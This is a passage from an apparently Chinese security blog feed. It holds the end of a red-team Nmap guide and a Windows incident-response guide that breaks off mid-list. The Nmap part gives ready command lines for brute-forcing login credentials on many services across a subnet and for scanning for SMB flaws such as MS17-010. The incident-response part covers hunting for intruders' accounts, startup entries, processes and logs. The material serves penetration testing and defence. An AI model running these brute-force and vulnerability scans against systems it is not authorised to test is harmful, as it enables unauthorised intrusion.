<td>$ nmap -p 27017  –script mongodb-brute 192.168.1.0&#x2F;24</td>
</tr>
<tr>
<td>redis-brute.nse</td>
<td>redis爆破</td>
<td>$ nmap -p 6379 –script redis-brute.nse 192.168.1.0&#x2F;24</td>
</tr>
</tbody></table>
<h4 id="12-VPN利用脚本"><a href="#12-VPN利用脚本" class="headerlink" title="12. VPN利用脚本"></a>12. VPN利用脚本</h4><table>
<thead>
<tr>
<th>脚本</th>
<th>描述</th>
<th>实例</th>
</tr>
</thead>
<tbody><tr>
<td>pptp-version.nse</td>
<td>识别目标pptp版本</td>
<td>$ nmap -p 1723 –script pptp-version.nse 192.168.1.0&#x2F;24</td>
</tr>
</tbody></table>
<h4 id="13-SMB利用脚本"><a href="#13-SMB利用脚本" class="headerlink" title="13. SMB利用脚本"></a>13. SMB利用脚本</h4><p>SMB远程执行漏洞脚本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">smb-vuln-ms06-025.nse</span><br><span class="line">smb-vuln-ms07-029.nse</span><br><span class="line">smb-vuln-ms08-067.nse</span><br><span class="line">smb-vuln-ms10-054.nse</span><br><span class="line">smb-vuln-ms10-061.nse</span><br><span class="line">smb-vuln-ms17-010.nse</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ nmap -p445 --script smb-vuln-ms17-010.nse 192.168.1.0/24</span><br></pre></td></tr></table></figure>

<h4 id="14-其他脚本"><a href="#14-其他脚本" class="headerlink" title="14. 其他脚本"></a>14. 其他脚本</h4><table>
<thead>
<tr>
<th>脚本</th>
<th>描述</th>
<th>实例</th>
</tr>
</thead>
<tbody><tr>
<td>rsync-brute.nse</td>
<td>爆破目标的rsync</td>
<td>$ nmap -p 873 –script rsync-brute –script-args ‘rsync-brute.module&#x3D;www’ 192.168.1.0&#x2F;24</td>
</tr>
<tr>
<td>rlogin-brute.nse</td>
<td>爆破目标的rlogin</td>
<td>$ nmap -p 513 –script rlogin-brute 192.168.1.0&#x2F;24</td>
</tr>
<tr>
<td>vnc-brute.nse</td>
<td>爆破目标的vnc</td>
<td>$ nmap –script vnc-brute -p 5900 192.168.1.0&#x2F;24</td>
</tr>
<tr>
<td>pcanywhere-brute.nse</td>
<td>爆破pcanywhere</td>
<td>$ nmap -p 5631 –script&#x3D;pcanywhere-brute 192.168.1.0&#x2F;24</td>
</tr>
<tr>
<td>nexpose-brute.nse</td>
<td>爆破nexpose</td>
<td>$ nmap –script nexpose-brute -p 3780 192.168.1.0&#x2F;24</td>
</tr>
<tr>
<td>shodan-api.nse</td>
<td>配合shodan接口进行扫描</td>
<td>$ nmap –script shodan-api –script-args ‘shodan-api.target&#x3D;192.168.1.0&#x2F;24,shodan-api.apikey&#x3D;SHODANAPIKEY’</td>
</tr>
</tbody></table>
<h3 id="0x05-扫描实战"><a href="#0x05-扫描实战" class="headerlink" title="0x05 扫描实战"></a>0x05 扫描实战</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">依据目标系统端口及服务，选取对应扫描脚本进行扫描探测</span><br></pre></td></tr></table></figure>

<p><strong>目标C段常规漏洞扫描</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ nmap -sT -Pn -v --script dns-zone-transfer.nse,ftp-anon.nse,ftp-proftpd-backdoor.nse,ftp-vsftpd-backdoor.nse,ftp-vuln-cve2010-4221.nse,http-backup-finder.nse,http-cisco-anyconnect.nse,http-iis-short-name-brute.nse,http-put.nse,http-php-version.nse,http-shellshock.nse,http-robots.txt.nse,http-svn-enum.nse,http-webdav-scan.nse,iis-buffer-overflow.nse,iax2-version.nse,memcached-info.nse,mongodb-info.nse,msrpc-enum.nse,ms-sql-info.nse,mysql-info.nse,nrpe-enum.nse,pptp-version.nse,redis-info.nse,rpcinfo.nse,samba-vuln-cve-2012-1182.nse,smb-vuln-ms08-067.nse,smb-vuln-ms17-010.nse,snmp-info.nse,sshv1.nse,xmpp-info.nse,tftp-enum.nse,teamspeak2-version.nse 192.168.1.0/24</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>目标C段弱口令爆破</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ nmap -sT -v -Pn --script ftp-brute.nse,imap-brute.nse,smtp-brute.nse,pop3-brute.nse,mongodb-brute.nse,redis-brute.nse,ms-sql-brute.nse,rlogin-brute.nse,rsync-brute.nse,mysql-brute.nse,pgsql-brute.nse,oracle-sid-brute.nse,oracle-brute.nse,rtsp-url-brute.nse,snmp-brute.nse,svn-brute.nse,telnet-brute.nse,vnc-brute.nse,xmpp-brute.nse 192.168.1.0/24</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="0xFF-Reference"><a href="#0xFF-Reference" class="headerlink" title="0xFF Reference"></a>0xFF Reference</h3><ul>
<li><p><a href="https://zh.wikipedia.org/wiki/%E4%BC%A0%E8%BE%93%E6%8E%A7%E5%88%B6%E5%8D%8F%E8%AE%AE">wikipedia&#x2F;Transmission_Control_Protocol</a></p>
</li>
<li><p><a href="https://nmap.org/docs.html">https://nmap.org/docs.html</a></p>
</li>
<li><p><a href="https://nmap.org/book/man.html">https://nmap.org/book/man.html</a></p>
</li>
<li><p><a href="https://nmap.org/nsedoc/">https://nmap.org/nsedoc/</a></p>
</li>
<li><p><a href="https://github.com/nmap/nmap/tree/master/scripts">https://github.com/nmap/nmap/scripts</a></p>
</li>
<li><p><a href="http://www.nmap.com.cn/doc/manual.shtm">http://www.nmap.com.cn/doc/manual.shtm</a></p>
</li>
<li><p><a href="https://www.oreilly.com/library/view/mastering-the-nmap/9781782168317/">Mastering the Nmap Scripting Engine</a></p>
</li>
<li><p><a href="https://www.hackingarticles.in/category/nmap/">https://www.hackingarticles.in/category/nmap/</a></p>
</li>
</ul>
<hr>
<center>本文涉及内容，仅限于网络安全从业者学习交流，切勿用于非法用途...
</center>]]></content>
      <categories>
        <category>红队渗透</category>
      </categories>
      <tags>
        <tag>Tookit</tag>
        <tag>Nmap</tag>
        <tag>Initial Access</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows应急响应指南</title>
    <url>/posts/10128/</url>
    <content><![CDATA[<center>本文总结Windows系统应急响应的基本思路与技巧...</center>

<span id="more"></span>

<h2 id="0x01-系统排查"><a href="#0x01-系统排查" class="headerlink" title="0x01 系统排查"></a>0x01 系统排查</h2><h3 id="1-系统信息"><a href="#1-系统信息" class="headerlink" title="1. 系统信息"></a>1. 系统信息</h3><p>命令行输入<code>msinfo32</code>命令，打开系统信息窗口，可查看本地计算机硬件资源、组件和软件环境信息</p>
<p>软件环境中包含系统驱动程序、正在运行任务、加载的模块、服务、启动程序等信息</p>
<h3 id="2-用户账号"><a href="#2-用户账号" class="headerlink" title="2. 用户账号"></a>2. 用户账号</h3><p>系统被入侵后，需排查攻击者是否新建账户、激活系统默认账户、建立隐藏账户(账户名称最后加$)等</p>
<p><strong>排查方法</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(1) 命令行查看</span><br><span class="line"></span><br><span class="line">&gt; net user  //收集用户账户信息，无法查看隐藏账户</span><br><span class="line"></span><br><span class="line">&gt; net user username  //查看某个账户详细信息</span><br><span class="line"></span><br><span class="line">(2) 图形界面查看</span><br><span class="line"></span><br><span class="line">a. CMD输入compmgmt.msc(计算机管理) -&gt; 本地用户和组 -&gt; 用户  //可查看隐藏账户</span><br><span class="line"></span><br><span class="line">b. 命令行输入lusermgr.msc，查看用户信息</span><br><span class="line"></span><br><span class="line">(3) wmic 命令</span><br><span class="line"></span><br><span class="line">&gt; wmic useraccount get name,SID  //可查看隐藏账户</span><br></pre></td></tr></table></figure>

<h3 id="3-启动项"><a href="#3-启动项" class="headerlink" title="3. 启动项"></a>3. 启动项</h3><p>病毒后门等常用启动项来实现持久化驻留，检查服务器是否有异常的启动项</p>
<p><strong>排查方法</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(1) 任务管理器查看</span><br><span class="line"></span><br><span class="line">命令行中输入taskmgr命令，任务管理器 -&gt; 启动</span><br><span class="line"></span><br><span class="line">(2) 通过注册表查看</span><br><span class="line"></span><br><span class="line">单击【开始】&gt;【运行】，输入regedit，打开注册表，查看开机启动项是否正常，关注以下注册表项</span><br><span class="line"></span><br><span class="line">  a. HKEY_CURRENT_USER\software\micorsoft\windows\currentversion\run </span><br><span class="line"></span><br><span class="line">  b. HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run </span><br><span class="line"></span><br><span class="line">  c. HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Runonce</span><br><span class="line"></span><br><span class="line">检查右侧是否有启动异常的项目</span><br><span class="line"></span><br><span class="line">(3) 通过组策略查看</span><br><span class="line"></span><br><span class="line">命令行运行gpedit.msc，计算机配置 -&gt; Windows设置 —&gt; 脚本(启动/关机)</span><br></pre></td></tr></table></figure>

<h3 id="4-计划任务"><a href="#4-计划任务" class="headerlink" title="4. 计划任务"></a>4. 计划任务</h3><p><strong>检查方法</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(1) 计算机管理</span><br><span class="line"></span><br><span class="line">CMD输入compmgmt.msc【计算机管理】 &gt; 【系统工具】&gt; 【任务计划程序】&gt; 【任务计划程序库】</span><br><span class="line"></span><br><span class="line">(2) schtasks命令</span><br><span class="line"></span><br><span class="line">命令行输入【schtasks】命令，获取任务计划信息；在较旧的系统用【at】命令</span><br><span class="line"></span><br><span class="line">(3) Powershell</span><br><span class="line"></span><br><span class="line">&gt; Get-ScheduledTask  //查看当前系统所有任务计划信息</span><br></pre></td></tr></table></figure>

<h3 id="5-服务自启功"><a href="#5-服务自启功" class="headerlink" title="5. 服务自启功"></a>5. 服务自启功</h3><p><strong>检查方法：</strong> 单击【开始】&gt;【运行】，输入services.msc，查看服务状态和启动类型，检查是否有异常服务</p>
<h2 id="0x02-进程排查"><a href="#0x02-进程排查" class="headerlink" title="0x02 进程排查"></a>0x02 进程排查</h2><h3 id="1-排查思路"><a href="#1-排查思路" class="headerlink" title="1. 排查思路"></a>1. 排查思路</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt; netstat -ano | findstr &quot;ESTABLISHED&quot; //查看目前的网络连接，定位可疑的ESTABLISHED</span><br><span class="line"></span><br><span class="line">&gt; tasklist | findstr “PID”  //根据netstat定位出的pid，再通过tasklist命令排查进程</span><br></pre></td></tr></table></figure>

<h3 id="2-技巧总结"><a href="#2-技巧总结" class="headerlink" title="2. 技巧总结"></a>2. 技巧总结</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(1) tasklist命令</span><br><span class="line"></span><br><span class="line">  a. 查看端口对应的PID： netstat -ano | findstr “port”</span><br><span class="line"></span><br><span class="line">  ​b. 查看进程对应的PID：tasklist | findstr “PID”</span><br><span class="line"></span><br><span class="line">  c. 显示进程与服务对应关系：tasklist /svc</span><br><span class="line"></span><br><span class="line">  d. 查看加载DLL的进程：tasklist /m | more</span><br><span class="line"></span><br><span class="line">  e. 查看特定DLL的调用情况：tasklist /m DLL名称</span><br><span class="line"></span><br><span class="line">(2) wmic命令</span><br><span class="line"></span><br><span class="line">  a. wmic process list full /format:csv  //以csv格式显示进程所有信息</span><br><span class="line"></span><br><span class="line">  b. wmic process get name,parentprocessid,processid,commandline  /format:csv  //以csv格式显示进程特定列</span><br><span class="line"></span><br><span class="line">  c. wmic process where process=[pid] get parentprocessid  //以pid的值为条件获取其父进程pid</span><br><span class="line"></span><br><span class="line">  d. wmic process where processid=[pid] delete  //删除指定pid的进程</span><br><span class="line"></span><br><span class="line">  e. wmic process where name=&quot;trojan.exe&quot; call terminate  //删除指定进程名的进程</span><br><span class="line"></span><br><span class="line">(3) PowerShell</span><br><span class="line"></span><br><span class="line">PowerShell可查看存在守护进程的进程，查询时调用Wmi对象</span><br><span class="line"></span><br><span class="line">&gt; Get-WmiObject Win32_Process | select Name,ProcessId,ParentProcessId,Path,CommandLine  //查看进程名、进程id，父进程id、进程路径、进程命令行等信息</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="0x03-文件排查"><a href="#0x03-文件排查" class="headerlink" title="0x03 文件排查"></a>0x03 文件排查</h2><h3 id="1-敏感目录"><a href="#1-敏感目录" class="headerlink" title="1. 敏感目录"></a>1. 敏感目录</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(1) 各个盘下temp目录</span><br><span class="line"></span><br><span class="line">恶意程序运行时投放出的文件(释放子体)多存放于路径相对固定的临时目录</span><br><span class="line"></span><br><span class="line">(2) 用户Recent文件</span><br><span class="line"></span><br><span class="line">Recent文件主要存储最近运行文件的快捷方式，可分析最近运行的文件来排查可疑文件</span><br><span class="line"></span><br><span class="line">【开始】&gt;【运行】，输入【%UserProfile%\Recent】，分析Recent文件</span><br><span class="line"></span><br><span class="line">(3) 预读取文件夹</span><br><span class="line"></span><br><span class="line">Prefetch为预读取文件夹，用于存放系统已访问过的文件预读取信息，扩展名为pf</span><br><span class="line"></span><br><span class="line">【开始】&gt;【运行】，输入【%SystemRoot%\Prefetch\】，排查Prefetch文件夹</span><br><span class="line"></span><br><span class="line">(4) Amcache.hve文件</span><br><span class="line"></span><br><span class="line">可查询应用程序的执行路径、上次执行的时间以及SHA1值</span><br><span class="line"></span><br><span class="line">【开始】&gt;【运行】，输入【%SystemRoot%\appcompat\Programs\】，排查Amcache.hve文件夹</span><br></pre></td></tr></table></figure>

<h3 id="2-时间点查找"><a href="#2-时间点查找" class="headerlink" title="2. 时间点查找"></a>2. 时间点查找</h3><p>入侵事件发生后，需优先确认时间发生的时间点，排查时间点前后的文件变动情况</p>
<p><strong>排查技巧</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(1) forfiles命令</span><br><span class="line"></span><br><span class="line">FORFILES [/P pathname] [/M searchmask] [/S]</span><br><span class="line">         [/C command] [/D [+ | -] &#123;yyyy/MM/dd | dd&#125;]</span><br><span class="line"></span><br><span class="line">描述:</span><br><span class="line">    选择一个文件(或一组文件)并在那个文件上</span><br><span class="line">    执行一个命令。这有助于批处理作业。</span><br><span class="line"></span><br><span class="line">参数列表:</span><br><span class="line">    /P    pathname      表示开始搜索的路径。默认文件夹是当前工作的</span><br><span class="line">                        目录 (.)。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    /M    searchmask    根据搜索掩码搜索文件。默认搜索掩码是 &#x27;*&#x27;。</span><br><span class="line"></span><br><span class="line">    /S                  指导 forfiles 递归到子目录。像 &quot;DIR /S&quot;。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    /C    command       表示为每个文件执行的命令。命令字符串应该</span><br><span class="line">                        用双引号括起来。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                        默认命令是 &quot;cmd /c echo @file&quot;。下列变量</span><br><span class="line">                        可以用在命令字符串中:</span><br><span class="line"></span><br><span class="line">                        @file    - 返回文件名。</span><br><span class="line">                        @fname   - 返回不带扩展名的文件名。</span><br><span class="line"></span><br><span class="line">                        @ext     - 只返回文件的扩展名。</span><br><span class="line"></span><br><span class="line">                        @path    - 返回文件的完整路径。</span><br><span class="line">                        @relpath - 返回文件的相对路径。</span><br><span class="line"></span><br><span class="line">                        @isdir   - 如果文件类型是目录，返回 &quot;TRUE&quot;；</span><br><span class="line">                                   如果是文件，返回 &quot;FALSE&quot;。</span><br><span class="line">                        @fsize   - 以字节为单位返回文件大小。</span><br><span class="line"></span><br><span class="line">                        @fdate   - 返回文件上一次修改的日期。</span><br><span class="line"></span><br><span class="line">                        @ftime   - 返回文件上一次修改的时间。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                        要在命令行包括特殊字符，字符请以 0xHH</span><br><span class="line">                        形式使用十六进制代码(例如，0x09 为 tab)。</span><br><span class="line"></span><br><span class="line">                        内部 CMD.exe 命令前面应以 &quot;cmd /c&quot; 开始。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    /D    date          选择文件，其上一次修改日期大于或等于 (+)，</span><br><span class="line">                        或者小于或等于 (-) 用 &quot;yyyy/MM/dd&quot; 格式指定的日期;</span><br><span class="line"></span><br><span class="line">                        或选择文件，其上一次修改日期大于或等于 (+)</span><br><span class="line">                        当前日期加 &quot;dd&quot; 天，或者小于或等于 (-) 当前</span><br><span class="line"></span><br><span class="line">                        日期减 &quot;dd&quot; 天。有效的 &quot;dd&quot; 天数可以是</span><br><span class="line">                        0 - 32768 范围内的任何数字。如果没有指定，</span><br><span class="line"></span><br><span class="line">                        &quot;+&quot; 被当作默认符号。</span><br><span class="line"></span><br><span class="line">    /?                  显示此帮助消息。</span><br></pre></td></tr></table></figure>

<h2 id="0x04-日志分析"><a href="#0x04-日志分析" class="headerlink" title="0x04 日志分析"></a>0x04 日志分析</h2><h3 id="1-日志简介"><a href="#1-日志简介" class="headerlink" title="1. 日志简介"></a>1. 日志简介</h3><p>Windows主要有以下三类日志文件：应用程序日志、系统日志和安全日志</p>
<p><strong>系统日志</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">记录操作系统组件产生的事件，主要包括驱动程序、系统组件和应用软件的崩溃以及数据丢失错误等</span><br><span class="line"></span><br><span class="line">默认位置：%SystemRoot%\System32\Winevt\Logs\System.evtx</span><br></pre></td></tr></table></figure>

<p><strong>安全日志</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">记录系统的安全审计事件，包含各种类型的登录日志、对象访问日志、进程追踪日志、特权使用、帐号管理、策略变更、系统事件。默认设置下，安全性日志是关闭的，管理员可以使用组策略来启动安全性日志，或者在注册表中设置审核策略</span><br><span class="line"></span><br><span class="line">默认位置：%SystemRoot%\System32\Winevt\Logs\Security.evtx</span><br></pre></td></tr></table></figure>

<p><strong>应用日志</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">包含由应用程序或系统程序记录的事件，主要记录程序运行方面的事件，例如数据库程序可以在应用程序日志中记录文件错误。如果某个应用程序出现崩溃情况，可以从程序事件日志中找到相应的记录</span><br><span class="line"></span><br><span class="line">默认位置：%SystemRoot%\System32\Winevt\Logs\Application.evtx</span><br></pre></td></tr></table></figure>

<h3 id="2-日志事件ID"><a href="#2-日志事件ID" class="headerlink" title="2. 日志事件ID"></a>2. 日志事件ID</h3><p>对于Windows事件日志分析，不同的EVENT ID代表了不同的意义，摘录一些常见的安全事件的说明</p>
<table>
<thead>
<tr>
<th>事件ID</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>4624</td>
<td>登录成功</td>
</tr>
<tr>
<td>4625</td>
<td>登录失败</td>
</tr>
<tr>
<td>4634</td>
<td>注销成功</td>
</tr>
<tr>
<td>4647</td>
<td>用户启动的注销</td>
</tr>
<tr>
<td>4672</td>
<td>使用超级用户（如管理员）进行登录</td>
</tr>
<tr>
<td>4720</td>
<td>创建用户</td>
</tr>
</tbody></table>
<p>每个成功登录的事件都会标记一个登录类型，不同登录类型代表不同的方式：</p>
<table>
<thead>
<tr>
<th>登录类型</th>
<th>描述</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>2</td>
<td>交互式登录（Interactive）</td>
<td>用户在本地进行登录</td>
</tr>
<tr>
<td>3</td>
<td>网络（Network）</td>
<td>最常见的情况就是连接到共享文件夹或共享打印机时</td>
</tr>
<tr>
<td>4</td>
<td>批处理（Batch）</td>
<td>通常表明某计划任务启动</td>
</tr>
<tr>
<td>5</td>
<td>服务（Service）</td>
<td>每种服务都被配置在某个特定的用户账号下运行</td>
</tr>
<tr>
<td>7</td>
<td>解锁（Unlock）</td>
<td>屏保解锁</td>
</tr>
<tr>
<td>8</td>
<td>网络明文（NetworkCleartext）</td>
<td>登录的密码在网络上是通过明文传输的，如FTP</td>
</tr>
<tr>
<td>9</td>
<td>新凭证（NewCredentials）</td>
<td>使用带&#x2F;Netonly参数的RUNAS命令运行一个程序</td>
</tr>
<tr>
<td>10</td>
<td>远程交互，（RemoteInteractive）</td>
<td>通过终端服务、远程桌面或远程协助访问计算机</td>
</tr>
<tr>
<td>11</td>
<td>缓存交互（CachedInteractive）</td>
<td>以一个域用户登录而又没有域控制器可用</td>
</tr>
</tbody></table>
<h3 id="3-日志分析技巧"><a href="#3-日志分析技巧" class="headerlink" title="3. 日志分析技巧"></a>3. 日志分析技巧</h3><p><strong>事件查看器</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(1) 利用eventlog事件来查看系统账号登录情况</span><br><span class="line"></span><br><span class="line">  a. 在“开始”菜单上，依次指向“所有程序”、“管理工具”，然后单击“事件查看器”；</span><br><span class="line"></span><br><span class="line">  b. 在事件查看器中，单击“安全”，查看安全日志；</span><br><span class="line"></span><br><span class="line">  c. 在安全日志右侧操作中，点击“筛选当前日志”，输入事件ID进行筛选。</span><br><span class="line"></span><br><span class="line">  4624 -- 登录成功</span><br><span class="line">  4625 -- 登录失败</span><br><span class="line">  4634 -- 注销成功 4647 -- 用户启动的注销</span><br><span class="line">  4672 -- 使用超级用户（如管理员）进行登录</span><br><span class="line"></span><br><span class="line">(2) 利用eventlog事件来查看计算机开关机的记录</span><br><span class="line"></span><br><span class="line">  a. 在“开始”菜单上，依次指向“所有程序”、“管理工具”，然后单击“事件查看器”；</span><br><span class="line"></span><br><span class="line">  b. 在事件查看器中，单击“系统”，查看系统日志；</span><br><span class="line"></span><br><span class="line">  c. 在系统日志右侧操作中，点击“筛选当前日志”，输入事件ID进行筛选</span><br><span class="line"></span><br><span class="line">  6006 -- 服务已启动，开机</span><br><span class="line">  6005 -- 服务已停止，关机</span><br><span class="line">  6009 -- 按ctrl、alt、delete键(非正常)关机</span><br></pre></td></tr></table></figure>

<p><strong>Log Parser</strong></p>
<p>Log Parser是微软公司出品的日志分析工具，功能强大，使用简单，可以分析基于文本的日志文件、XML 文件、CSV（逗号分隔符）文件，以及操作系统的事件日志、注册表、文件系统、Active Directory</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(1) 基本查询语法</span><br><span class="line"></span><br><span class="line">  Logparser.exe –i:EVT –o:DATAGRID &quot;SELECT * FROM c:\xx.evtx&quot;</span><br><span class="line"></span><br><span class="line">(2) 查询登录成功的事件</span><br><span class="line"></span><br><span class="line">  a. 登录成功的所有事件</span><br><span class="line">  LogParser.exe -i:EVT –o:DATAGRID  &quot;SELECT *  FROM c:\Security.evtx where EventID=4624&quot;</span><br><span class="line"></span><br><span class="line">  b. 指定登录时间范围的事件</span><br><span class="line">  LogParser.exe -i:EVT –o:DATAGRID  &quot;SELECT *  FROM c:\Security.evtx where TimeGenerated&gt;&#x27;2018-06-19 23:32:11&#x27; and TimeGenerated&lt;&#x27;2018-06-20 23:34:00&#x27; and EventID=4624&quot;</span><br><span class="line"></span><br><span class="line">  c. 提取登录成功的用户名和IP</span><br><span class="line">  LogParser.exe -i:EVT  –o:DATAGRID  &quot;SELECT EXTRACT_TOKEN(Message,13,&#x27; &#x27;) as EventType,TimeGenerated as LoginTime,EXTRACT_TOKEN(Strings,5,&#x27;|&#x27;) as Username,EXTRACT_TOKEN(Message,38,&#x27; &#x27;) as Loginip FROM c:\Security.evtx where EventID=4624&quot;</span><br><span class="line"></span><br><span class="line">(3) 查询登录失败的事件</span><br><span class="line"></span><br><span class="line">  a. 登录失败的所有事件</span><br><span class="line">  LogParser.exe -i:EVT –o:DATAGRID  &quot;SELECT *  FROM c:\Security.evtx where EventID=4625&quot;</span><br><span class="line"></span><br><span class="line">  b. 提取登录失败用户名进行聚合统计</span><br><span class="line">  LogParser.exe  -i:EVT &quot;SELECT  EXTRACT_TOKEN(Message,13,&#x27; &#x27;)  as EventType,EXTRACT_TOKEN(Message,19,&#x27; &#x27;) as user,count(EXTRACT_TOKEN(Message,19,&#x27; &#x27;)) as Times,EXTRACT_TOKEN(Message,39,&#x27; &#x27;) as Loginip FROM c:\Security.evtx where EventID=4625 GROUP BY Message&quot;</span><br><span class="line"></span><br><span class="line">(4) 系统历史开关机记录</span><br><span class="line"></span><br><span class="line">  LogParser.exe -i:EVT –o:DATAGRID  &quot;SELECT TimeGenerated,EventID,Message FROM c:\System.evtx where EventID=6005 or EventID=6006&quot;</span><br></pre></td></tr></table></figure>
<h2 id="0x05-工具集合"><a href="#0x05-工具集合" class="headerlink" title="0x05 工具集合"></a>0x05 工具集合</h2><h3 id="1-工具箱"><a href="#1-工具箱" class="headerlink" title="1. 工具箱"></a>1. 工具箱</h3><p><a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/sysinternals-suite">Sysinternals Suite</a> : <em>微软发布的一套强大的免费工具程序集，共包括将近70个windows工具</em></p>
<ul>
<li><p><a href="http://technet.microsoft.com/zh-cn/sysinternals/bb664922.aspx">AccessChk</a> <em>了解特定用户或用户组对文件、目录、注册表项和Windows服务等资源具有哪种访问权限</em></p>
</li>
<li><p><a href="http://technet.microsoft.com/zh-cn/sysinternals/bb897332.aspx">AccessEnum</a> <em>显示用户可以用何种访问权限访问您系统中的目录、文件和注册表项，使用此工具可查找权限漏洞</em></p>
</li>
<li><p><a href="http://technet.microsoft.com/zh-cn/sysinternals/bb963907.aspx">AdExplorer</a> <em>Active Directory Explorer 是一个高级的 Active Directory (AD) 查看器和编辑器</em></p>
</li>
<li><p><a href="https://technet.microsoft.com/en-us/sysinternals/bb963902">AutoRuns</a> <em>windows启动程序管理工具，可显示系统启动或登录时会自动启动的项目和配置，包括扩展和加载各种Windows进程</em></p>
</li>
<li><p><a href="http://technet.microsoft.com/zh-cn/sysinternals/bb896655.aspx">Handle</a> <em>可显示哪些进程打开了哪些文件，以及更多其他信息</em></p>
</li>
<li><p><a href="http://technet.microsoft.com/zh-cn/sysinternals/bb896656.aspx">ListDLLs</a> <em>列出所有当前加载的 DLL，包括加载位置及其版本号，2.0版将打印已加载模块的完整路径名</em></p>
</li>
<li><p><a href="http://technet.microsoft.com/zh-cn/sysinternals/bb896769.aspx">LogonSessions</a> <em>列出系统中的活动登录会话</em></p>
</li>
<li><p><a href="https://technet.microsoft.com/en-us/sysinternals/bb896653">Process Explorer</a> <em>进程查看器，查看进程的详细信息包括CPU，GPU，IO，线程，句柄，内存</em></p>
</li>
<li><p><a href="https://technet.microsoft.com/en-us/sysinternals/bb896645">Process Monitor</a> <em>一个高级的windows监视器，实时显示文件系统，注册表，网络活动，进程或线程活动</em></p>
</li>
<li><p><a href="https://technet.microsoft.com/en-us/sysinternals/bb896649">PsTools</a> <em>PsTools 套件，可列出本地或远程计算机上运行的进程、远程运行进程、重新启动计算机、转储事件日志，以及执行其他任务</em></p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PsExec——执行远程过程</span><br><span class="line"></span><br><span class="line">PsFile——远程显示打开的文件</span><br><span class="line"></span><br><span class="line">PsGetSid——显示计算机的SID或一个用户</span><br><span class="line"></span><br><span class="line">PsInfo——系统信息列表</span><br><span class="line"></span><br><span class="line">PsKill——杀死进程的名字或进程ID</span><br><span class="line"></span><br><span class="line">PsList——列表详细信息流程</span><br><span class="line"></span><br><span class="line">PsLoggedOn——看谁的本地登录,通过资源共享</span><br><span class="line"></span><br><span class="line">PsLogList -倾倒事件日志记录</span><br><span class="line"></span><br><span class="line">PsPasswd——更改帐户密码</span><br><span class="line"></span><br><span class="line">psp -测试网络性能</span><br><span class="line"></span><br><span class="line">PsService——视图和控制服务</span><br><span class="line"></span><br><span class="line">PsShutdown——关闭,选择重新启动计算机</span><br><span class="line"></span><br><span class="line">PsSuspend——挂起和恢复过程</span><br></pre></td></tr></table></figure>

<ul>
<li><p><a href="http://technet.microsoft.com/zh-cn/sysinternals/bb897448.aspx">RegDelNull</a> <em>扫描并删除包含嵌入空字符的注册表项，标准注册表编辑工具不能删除这种注册表项</em></p>
</li>
<li><p><a href="http://technet.microsoft.com/zh-cn/sysinternals/bb897445.aspx">RootkitRevealer</a> <em>扫描系统以找出基于Rootkit的恶意软件</em></p>
</li>
<li><p><a href="http://technet.microsoft.com/zh-cn/sysinternals/bb897442.aspx">ShareEnum</a> <em>扫描网络上的文件共享并查看其安全设置，以关闭安全漏洞</em></p>
</li>
<li><p><a href="http://technet.microsoft.com/zh-cn/sysinternals/bb897439.aspx">Strings</a> <em>在二进制映像中搜索 ANSI 和 UNICODE 字符串</em></p>
</li>
<li><p><a href="https://technet.microsoft.com/en-us/sysinternals/bb897437">TcpView</a> <em>显示TCP和UDP端点的详细清单，包括进程名、远程地址和TCP连接的状态</em></p>
</li>
</ul>
<h3 id="2-监控分析"><a href="#2-监控分析" class="headerlink" title="2. 监控分析"></a>2. 监控分析</h3><ul>
<li><a href="https://www.huorong.cn/">火绒剑</a>  <em>火绒推出的一款专业的内核级监控分析工具</em></li>
</ul>
<h3 id="3-日志分析"><a href="#3-日志分析" class="headerlink" title="3. 日志分析"></a>3. 日志分析</h3><ul>
<li><p><a href="https://www.microsoft.com/en-us/download/details.aspx?id=24659">Log Parser</a> <em>微软推出的日志分析工具，可分析多种文件类型的系统事件日志、注册表、文件系统、Active Directory</em></p>
</li>
<li><p><a href="https://event-log-explorer.en.softonic.com/">Event Log Explorer</a> <em>Windows日志分析工具，可用于查看，监视和分析跟事件记录</em></p>
</li>
</ul>
<h3 id="4-病毒查杀"><a href="#4-病毒查杀" class="headerlink" title="4. 病毒查杀"></a>4. 病毒查杀</h3><ul>
<li><p>卡巴斯基：<a href="http://devbuilds.kaspersky-labs.com/devbuilds/KVRT/latest/full/KVRT.exe">http://devbuilds.kaspersky-labs.com/devbuilds/KVRT/latest/full/KVRT.exe</a></p>
</li>
